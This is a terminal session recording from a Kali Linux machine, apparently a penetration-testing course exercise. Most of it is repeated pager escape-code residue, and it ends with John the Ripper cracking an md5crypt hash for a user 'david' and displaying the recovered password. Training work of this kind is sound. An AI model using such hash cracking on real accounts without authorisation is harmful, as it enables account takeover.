[KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K[?1l>[?1049l[23;0;0t]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# man john [Kjohn pass_david 
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 22 candidates buffered for the current salt, minimum 48 needed for performance.
+divad            (david[0m)
+1g 0:00:00:00 DONE 1/3 (2019-11-29 15:04) 100.0g/s 2200p/s 2200c/s 2200C/s david..id
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# john pass_david  --show
+david:divad:1503:1503::/home/david:/bin/sh
+
+1 password hash cracked, 0 left
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# exit
+exit
+
+Script done on 2019-11-29 17:15:49+01:00 [COMMAND_EXIT_CODE="0"]
